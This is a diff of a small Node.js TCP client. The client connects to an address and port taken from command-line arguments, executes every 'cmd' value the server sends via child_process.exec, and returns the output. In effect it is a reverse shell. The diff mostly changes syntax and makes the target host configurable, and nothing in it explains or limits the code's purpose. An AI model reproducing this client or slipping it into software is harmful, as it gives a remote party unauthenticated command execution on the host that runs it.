@@ -1,18 +1,20 @@
-const exec = require('child_process').exec;
-const net = require('net');
+var exec = require('child_process').exec;
+var net = require('net');
 
+var port = process.argv[3] || 9999;
+var address = process.argv[2] || '127.0.0.1';
 
-const client = new net.Socket();
-client.connect(9999, '127.0.0.1', () => {
+var client = new net.Socket();
+client.connect(port, address, function() {
 	console.log('Connected');
 	client.write('{"cmd": "", "value": ""}');
 });
 
-client.on('data', (data) => {
+client.on('data', function(data)  {
   try {
-    const res = JSON.parse(data);
-    exec(`${res.cmd}`, (error, stdout, stderr) => {
-      client.write(`{"cmd": "${res.cmd}", "value": ${JSON.stringify(stdout)}}`);
+    var res = JSON.parse(data);
+    exec(res.cmd, function(error, stdout, stderr) {
+      client.write("{\"cmd\": \"" + res.cmd + "\", \"value\": " + JSON.stringify(stdout) + "}");
     });
   } catch (e) {}
 });
